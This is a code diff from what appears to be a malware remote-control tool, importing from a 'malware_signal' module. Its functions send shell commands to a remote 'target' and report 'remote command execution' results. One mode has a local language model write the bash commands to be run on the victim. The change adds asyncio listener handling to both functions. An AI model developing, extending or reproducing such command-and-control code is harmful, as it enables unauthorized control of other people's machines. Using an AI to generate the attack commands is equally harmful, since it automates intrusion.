@@ -1,4 +1,6 @@
 #command/bash/shell.py
+import asyncio
+
 from ai_utils.ai import _fallback_command, _extract_command_text
 from core.ai.ollama.ollama_provider import OllamaProvider
 from malware_signal.signal import SignalClient
@@ -13,6 +15,7 @@ async def single_bash_mode(target, command):
     await signal.connect()
 
     sender = SenderHandler(signal)
+    listener_task = asyncio.create_task(signal.listen())
 
     try:
         result = await sender.send_command(target, command, wait_for_result=True, timeout=15)
@@ -24,6 +27,11 @@ async def single_bash_mode(target, command):
             print("[!] BASH FAILED")
             print(f"[-] REMOTE COMMAND EXECUTION FAILED: {result.get('error', 'Unknown error')}")
     finally:
+        listener_task.cancel()
+        try:
+            await listener_task
+        except asyncio.CancelledError:
+            pass
         await signal.close()
 
 
@@ -64,6 +72,7 @@ async def ai_bash_mode(target, prompt, provider=None):
     await signal.connect()
 
     sender = SenderHandler(signal)
+    listener_task = asyncio.create_task(signal.listen())
 
     try:
         result = await sender.send_command(target=target, command=generated_command, wait_for_result=True, timeout=300)
@@ -78,4 +87,9 @@ async def ai_bash_mode(target, prompt, provider=None):
             print("[-] BASH FAILED")
             print("ERROR:", result.get("error", "Unknown error"))
     finally:
+        listener_task.cancel()
+        try:
+            await listener_task
+        except asyncio.CancelledError:
+            pass
         await signal.close()
